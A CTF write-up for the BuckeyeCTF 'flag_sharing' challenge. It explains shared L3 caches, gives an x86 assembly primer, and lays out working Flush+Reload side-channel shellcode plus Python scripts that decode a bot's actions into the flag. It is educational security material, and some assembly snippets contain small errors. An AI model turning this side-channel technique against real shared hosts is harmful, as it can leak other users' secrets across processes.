
# BuckeyeCTF - pwn/flag_sharing

This challenge, which remained unsolved at the end of the CTF, provided a fantastic opportunity to learn about two intimidating topics, which turned out both to not be quite as bad as your imagination might lead you to believe: assembly language and the cache.

**The Challenge:** Hosted on an AWS server is a port you can connect to in order to create a new instance of the challenge, giving you a new IP and port to connect to. This instance essentially allocates a processor which you can act on, while a bot simultaneously performs actions. Importantly, in the README file provided by the author `ath0` it informs us that the "t2" family of AWS instances has intel-based processors with an inclusive, shared, L3 cache. This means that our objective in this challenge will be to discern the flag by spying on the bot's actions across the cache, known as a "side-channel cache attack." Specifically, each every two bits of the flag will cause the bot to one of four actions, which we must detect to then deduce the flag.

# The Cache

Prior to this challenge, I had no knowledge of the behavior of the cache, but a [research paper](https://eprint.iacr.org/2013/448.pdf) from the University of Adelaide provided a good description of the exact kind of attack needed for this challenge. I will summarize the useful information I found from it, but it is a great, very readable paper with a *lot* of great information.

## Behavior

When the computer executes a program, it needs to access the memory which corresponds to the program instructions it wants to follow. So, the processor needs to grab that memory. In most systems, that memory is physically distant from the processor, meaning that the fetch time for the information is slow (in the computer's frame of reference), so fetching data from memory every time you want to access that memory can be extremely slow. 

To deal with this fact, processors have caches which store recently accessed memory in order to speed the process of reading that memory again in the near future. A cache is a small store of memory n the processor's chip itself, so fetching data from it is **much** faster than from the computer's other memory. This data is loaded to the cache in the form of `cache lines`, usually 64 bytes in length. After a certain period of the memory going unused, or when there is no more space for new data to be loaded, it is "flushed" from the cache, so the next time that memory is accessed it will be slow again.
![cache_distance_img](https://github.com/HAM3131/pictures/blob/76907fef2144e5f3e1fd29a31c27b05bb19c4aec/memory_vs_cache_distance.png?raw=true)
You might be wondering how this is useful to us in spying on the bot. Because the processor has a shared L3 cache, which will be described in more detail in the following section, multiple processes running on our instance will actually access the *same* cache. So, when the bot calls a function which will access memory line X and load it into the cache, the next time we access that memory line it will be a quick response! So, by repeatedly flushing the memory lines we want to observe and loading them after a short wait, we can detect when the bot has accessed those lines when the response time is fast.

## Structure

Modern processors have a cache structure with multiple levels of caches, shown below is the cache hierarchy of the Core i5-3470 processor, taken from the paper referenced above.
![Cache structure image](https://github.com/HAM3131/pictures/blob/main/cache_structure.png?raw=true)
Each core of the processor has it's own cache, consisting of an L1 and L2, and the processors has a shared cache (just like our challenge!) in which **all** the contents of the other caches are also stored. Importantly, flushing memory from the L3 cache will *also* flush the same cache lines from the other lower level caches because of the way that the L3 cache is set up to contain all the same memory as the lower level caches, and no more. This allows us to flush the cache lines of a process operating on another core, which is crucial, as we could not spy on the process behavior without this. A processor without a shared cache is not vulnerable to this form of attack.

# Assembly Language

By looking at the `challenge.c` file provided in the challenge distribution, we can see that our attack will be provided by sending the raw machine code of what we want executed on the server. In order to directly access and flush from the cache, and provide machine code which executes independently, we will write our exploit in assembly language.

## Registers

On a processor, memory is manipulated by placing it in 'registers' and performing operations on those registers. The size of a register is determined by the architecture of the system you are working on, and in the case of this challenge, with a 64-bit architecture, the registers are 8 bytes each. There are a limited number of registers, so sometimes multiple operations you are performing will want to use the same register. In order to preserve the values you have stored in the registers, you may need to push that value to the stack, and pop it back into the register after the other operation is completed. Registers have three character names, beginning with 'r', and are passed as arguments to assembly functions. The ones we will mostly be using are 'rsp', 'rdi', 'rdx', 'rbx', and 'rax', though there are others.

## Useful functions

Listed here the different assembly code functions and how they work. These are the functions we will use to write our solution. 

### mov

**Usage**: `mov destination, source`
Moves data from the source operand to the destination operand.
```assembly
mov rcx, 1 ; Move 1 into the rcx register
```

### cmp

**Usage**: `cmp operand1, operand2`
Compares two operands and sets the flags based on the result.
```assembly
cmp eax, ebx ; Compare eax and ebx
```

### test

**Usage**: `test operand1, operand2`
Performs a bitwise AND operation between the operands and sets the flags based on the result, but doesn't store the result.
```assembly
test eax, eax ; Test if eax is zero
```

### jmp

**Usage**: `jmp label`
Jumps unconditionally to the specified label.
```assembly
jmp loop_start ; Jump to loop_start label
```

### jnz

**Usage**: `jnz label`
Jumps to the label if the Zero Flag is not set.
```assembly
jnz not_zero ; Jump to not_zero label if Zero Flag is not set
```

### push

**Usage**: `push operand`
Pushes the operand onto the stack.
```assembly
push eax ; Push eax onto the stack
```

### pop
**Usage**: `pop operand`
Pops the top value from the stack into the operand.
```assembly
pop eax ; Pop top of stack into eax
```

### rdtsc

**Usage**: `rdtsc`
Reads the time-stamp counter into EDX:EAX.
```assembly
rdtsc ; Read time-stamp counter
```

### dec

**Usage**: `dec operand`
Decrements the operand
```assembly
dec rcx ; Reduces the value in `rcx` by 1
```

## Creating a loop

Creating a loop in assembly is similar to a loop in other programming languages, but there are no existing structures like a `for` or `while` loop. Instead, a register stores a value tracking iterations, and at the end of the loop you perform the `test` operation to see if it is zero. Then you use the `jnz` function to jump back to a label at the start of the loop if the register is not zero.
**Example:**
```assembly
mov rcx 10          ; set the loop counter to 10
loop_start:
   ...              ; loop operations here
   dec rcx          ; decrement the loop counter
   test rcx, rcx    ; set the zero flag if rcx is zero
   jnz loop_start   ; continue the loop if rcx is zero
```

## Preserve a register

Some operations performed in assembly will use certain registers that you may already be storing values in. To avoid losing that data, you will want to preserve the register by pushing it onto the stack and then popping it back into the register after performing the other operations.
**Example:**
```assembly
mov rcx 10   ; imagine here that '10' is an important value we want to preserve
push rcx     ; push it onto the stack to preserve it (this copies the value)
...          ; other operations using `rcx`
pop rcx      ; restore the register
```

## Printing

To help with debugging it can be useful to print things to the console for us to read. This will also be how we get output from our spy. The `pwntools` library in python has some useful functions to help with this, so below is how we can push a string onto the stack, print it, and then remove that string from the stack.
```python
from pwn import *
# Store an 8-byte string on the stack to print as a prefix 
shellcode = shellcraft.pushstr("\nTime:\t") # Write the reload time to STDOUT shellcode += shellcraft.mov('r9', 1) # STDOUT file descriptor 
shellcode += ' lea rsi, [rsp]\n'  # Source address (8 bytes before the string where time is) 
shellcode += shellcraft.mov('rdx', 16) # Number of bytes to write 
shellcode += shellcraft.syscall('SYS_write', 'r9', 'rsi', 'rdx')
shellcode += ' add rsp, 8\n'  # Remove the string from the stack
```
We will also be converting our shellcode assembly into machine code through a `pwntools` function:
```python
machine_code = asm(shellcode)
```

## Flushing the cache

There is one more crucial assembly function for our attack: `clflush`. This function takes a single operand, and flushes from the cache the memory line stored in the operand register. 
**Example:**
```assembly
move rdi, 0xffffffff  ; assign a memory address to rdi
clflush [rdi]         ; flush that memory line
```
We don't just want to flush an arbitrary memory address though, so when we use this function we will need to make sure that we find a useful address to flush.

# Methodology

This section will detail the process we went through to find our solution. There are certainly more elegant solutions, but we were able to make it work with limited knowledge about the subject matter going into this.
First we'll outline our thought process we went through to come up with a solution, move onto mistakes we made, and finally go through the solution script we ended up with.

## Thought process

From the offset, because of the helpful information provided in the challenge's README file, we were able to pretty easily pin down that a side-channel cache attack was the vector for spying on the bot. Then, the outline of our program was pretty clear: we need to repeatedly flush and reload the memory locations associated with the different actions that the bot we spawn with the flag will take.

The machine code we inject is called as a function, which means that at the start of our machine code running there will be a return address on top of the stack pointing to the line in the `challenge.c` file where our code is injected. We can use a decompiling tool like Ghidra to find the offset from that address to the start of the four functions which the bot's actions might call: `move_up()`, `move_down()`, `move_right()`, and `move_left()`. Those will be the addresses we flush and reload to spy on the bot's actions. Then, we just need to indicate when those reloads are faster, telling us the bot has accessed that line. When that information is received by our program, we can decipher the actions into binary which reveals the flag by reversing the process the bot takes to choose it's actions.

## Pitfalls

There were numerous mistakes we made within this program, and we learned something new from each of them so we'll leave them here in case the reader would like to learn along with us.

### Preserving registers
One of the first mistakes made was in tracking the passage of time. When calling the `rdtsc` function we moved `rax` into `rdx` to store the time of our previous call of the function. This was careless however, as `rdtsc` actually stores part of the time stamp code in both `rax` and `rdx`, so when we tried subtracting the previous time from the current one the results were gibberish. The takeaway here is to always be careful when working with assembly code functions and the registers they operate on. It can be easy to overlook key features of these functions when you are unfamiliar with them.

### Waiting too long
A key feature of the side-channel cache attack is that there is a period of waiting between flushing and reloading during which you allow the victim process to act. Generally speaking, as depicted by this image from the paper mentioned earlier, the longer the wait time (so long as it is not longer than the time between actions taken by the victim process) the better, because the actions of the victim will more often be noticed.
![Side-channel cache attack timing image](https://github.com/HAM3131/pictures/blob/main/side-channel_cache_attack_timing.png?raw=true)
Because of this, and because we know from the bot script provided as a part of the challenge that the bot takes actions at 0.25s intervals, we were initially waiting a quarter second between each flush+reload. However, this method gave us the same results whether we flushed the memory or not, which indicated that whether we did it manually or not, the memory we were inspecting was being flushed from the cache, even after the victim process performed an action. This is because there are other processes, including the operating system, working in the cache. And, given enough time, the memory will always be flushed from the cache. So, we needed to inspect *much* shorter time intervals.

## Solve

So, we create three python scripts.
* One which is used to generate machine code to probe the flag
* One which probes the flag, filters the probed data, and adds it to the saved data
* And one which analyzes the saved data and produces the flag

### Payload generation
Below is the code used to generate a machine code payload. It takes a `pwntools` `ELF` object as a parameter, and an offset `pVal` to determine the offset of the function to look at form the return address we grab. This function is used a few times to spy on each of the functions individually. Then, we compile that data to get a clear picture of the bot's actions. The code is commented to describe the purpose of each action, but for more information on any of these assembly functions or methods used, most of them are described above.

```python
from pwn import  *

def  final_payload(EXE, pVal): # print a "\ntime:\t" prefix
	context.binary = EXE
	# Initialize shellcode
	shellcode =  ""

	# Initialize counter
	shellcode += shellcraft.mov('rcx', 0x1e9999) # Set counter to big number
	
	# Begin loop
	shellcode +=  'loop_start:\n'

	# Preserve rcx
	shellcode +=  ' push rcx\n'

	# Grab the return address to base our loop on
	shellcode +=  ' mov rdi, [rsp + 8]\n'

	# Wait 100,000 cycles to flush+relaod again
	shellcode += shellcraft.mov('rcx', 100000)
	shellcode +=  'wait_loop:\n'
	shellcode +=  ' dec rcx\n'
	shellcode +=  ' test rcx, rcx\n'
	shellcode +=  ' jnz wait_loop\n'

	# Add the the parameter {pVal} to rdi, offsetting the address to look at
	# a specific one of the functions we're spying on
	shellcode += shellcraft.mov('rcx', pVal)
	shellcode +=  ' add rdi, rcx\n'

	# The segment of code which loads the memory address determined above and
	# tracks the time to do it
	shellcode +=  'start_probe:\n'
	shellcode +=  ' mfence\n'
	shellcode +=  ' lfence\n'      # `mfence` and `lfence` commands prevent 
	shellcode +=  ' rdtsc\n'       # later lines from executing until everything
	shellcode +=  ' lfence\n'      # before them has finished, improving time
	shellcode +=  ' mov rbx, rax\n'# measurement
	shellcode +=  ' mov r10, [rdi]\n'   # Loading the memory address rdi
	shellcode +=  ' lfence\n'
	shellcode +=  ' rdtsc\n'
	shellcode +=  ' sub rax, rbx\n'
	shellcode +=  ' clflush [rdi]\n'

	# Check if the time waited to reload was less than 120 cycles
	shellcode +=  ' cmp rax, 120\n'  

	# Jump to skip_print if the condition is not met
	shellcode +=  ' jge skip_print\n'

	# Put the number 1 onto the stack (this is just what our program is looking
	# for to be outputted, could be anything
	shellcode += shellcraft.mov('rax', 1)
	shellcode +=  ' push rax\n'

	# Store an 8-byte string on the stack to print as a prefix
	shellcode += shellcraft.pushstr("\nTime:\t")

	# Write the reload time to STDOUT
	shellcode += shellcraft.mov('r9', 1) # STDOUT file descriptor
	shellcode +=  ' lea rsi, [rsp]\n'  # Source address (8 bytes before the string where time is)
	shellcode += shellcraft.mov('rdx', 16) # Number of bytes to write
	shellcode += shellcraft.syscall('SYS_write', 'r9', 'rsi', 'rdx')

	# Restore rcx (not actually
	shellcode +=  ' add rsp, 8\n'  # Remove the string from the stack
	shellcode +=  ' pop rax\n' # Just getting the 1 off the stack
	shellcode +=  'skip_print:\n'
	shellcode +=  ' pop rcx\n'

	# Decrement counter and check if zero
	shellcode +=  ' dec rcx\n'
	shellcode +=  ' test rcx, rcx\n'
	shellcode +=  ' jnz loop_start\n'

	# Exit
	shellcode += shellcraft.amd64.exit(0) # Exit
	return asm(shellcode)
```

### Hit "Cluster" Analysis
Since we are now checking each function at small intervals, we will get a "hit" (meaning the bot accessed the memory and placed it in the cache) multiple times for every time the bot performs an action. This was a challenge, but also a useful tool. Occasionally, due to the nature of this attack, false positives occur. However, they happen rarely, and they occur independently of one another. Thus, we knew that the true readings occurred when many rapid hits were read.

Below is our python script, which takes in a list ``results`` of the exact *time* each reading is made, filters for clusters, rewrites each as the difference from the first cluster, and then multiplies them by scaling factor which we found experimentally to be **0.9947** (the bot does not do actions at exactly 0.25 second intervals). 

```python
currentGroup = []
groupMeans = []
for x in results:
	if len(currentGroup) > 0:
		if x - currentGroup[-1] < 0.05:
			currentGroup.append(x)
		else:
			if len(currentGroup) > 1:
				groupMeans.append(mean(currentGroup))
			currentGroup = [x]
	else:
		currentGroup.append(x)
baseValue = groupMeans[0]
groupMeans = [(y-baseValue)*.9947  for y in groupMeans]
```
Next, we organize these mean cluster times by rounding them to the 0.25 second intervals which we know the bot does actions.
```python
returnVals = []
for x in groupMeans:
	returnVals.append(math.floor((x-groupMeans[1])*4+0.5)-math.floor((groupMeans[0]-groupMeans[1])*4+0.5))
```
This gives us, for the readings at a specific memory location, the exact 0.25 second intervals in which this location was accessed.
![flag_sharing_](https://github.com/HAM3131/pictures/blob/main/flag_sharing_sorting_alg.png?raw=true)
Here you can see the process in action. The raw data (Raw Reading) is first analyzed to get scaled means of the clusters (Cluster Average) and then aligned to 0.25 second intervals (Rounded Time).

### Filtering Inaccurate Data

Due to the nature of this method of attack, there are infrequent, but nonetheless present, inaccuracies. Thus, it is best practice to take *several* readings (3-5) for each of the four functions. Our "probing" program simply saved the data as a CSV, with the first value in each row being the label (0-3) of which function was read, and the rest being the 0.25 interval (0, 1, 5, 9, 10... for example). We then formulated an algorithm that simply took this data, and took the datapoints agreed upon by the majority of the results, as can be seen below.
```python
# Reads in data CSV
past_data = []
with open('flush_data.csv', 'r') as csv_file:
	reader = csv.reader(csv_file)
	for row in reader:
		past_data.append(row)

# Takes data which is "agreed upon" by most of the dataset (to cancel out noise)
# Only run when having at least 3 samples that seem to agree on >90% of data points
# Occasionally a sample is deeply incorrect (doesnt match any other samples).
# You can manually spot this and delete that sample, or ignore and collect more data so
stepResults = {}
for STEP in range(4):
	steps_mode_vals = []
	for x in range(500):
		seen = 0
		totalReads = 0
		for pad in past_data:
			if pad[0] == str(STEP):
				print(STEP)
				totalReads += 1
				if str(x) in pad[1:]:
					seen += 1
		if totalReads > 0  and seen/totalReads >= 0.5:
			steps_mode_vals.append(x)
	stepResults[STEP] = steps_mode_vals
```

### Double Hits
The last problem we faced was double accessing of memory. Since we were able to test "fake flags" with known bot actions, it was very quickly realized that often when a bot accesses the memory for `move_left` associated with ``01``, for example, it also accessed the memory for `move_right` associated with ``11``.

How do we combat this? Well, we found rather quickly that each function call still had a unique *pair* which our spy would see. For example, if we read a ``move_right`` *and* a `move_up`, we knew that would only occur if `move_right` had been called. This can be seen in this diagram, of the true readings we got from 3 characters of the flag.
![flag_sharing_filtered_results](https://github.com/HAM3131/pictures/blob/main/flag_sharing_filtered_results.png?raw=true)
* Note that, due to how the bot reads the flag, the bit pairs in each character are read in *little* endian, and thus are "backwards" of how one would generally read them. This cost me at least 2 hours of my life, despite being painfully obvious.

Conveniently, the "double" hits do not affect our ability to read the flag from the data at all.

Here you can see the Python algorithm we crafted to do this reading and output the flag.
```python
# Takes results and turns into text, taking into account the fact that:
# 10 -> 3
# 00 -> 2, 3
# 11 -> 1, 2
# 01 -> 0, 1
binaryList = []
for i in range(100):
	bString = ""
	for j in range(4):
		if i*4+j in trueValues.keys():
			theList = trueValues[i*4+j]
			if  0  in theList:
				bString = "01" + bString
			elif  1  in theList:
				bString = "11" + bString
			elif  2  in theList:
				bString = "00" + bString
			else:
				bString = "10" + bString
		else:
			break
	if len(bString) == 8:
		binaryList.append(int(bString, 2))
print(bytes(binaryList))
```

## Putting it all Together
First, the data is probed multiple times by the user (us!) for each of the three functions, until satisfactory amounts of data is read. Then, the data is analyzed and the flag is produced.

For the sake of completion (and our hard work), when all is said and done, our program outputted for us
```python
b'{y0u_h4v3_b33n_f1ag_5h4r1ng_th1s_ent1r3_t1me???}\n'
```
also known as the FLAG!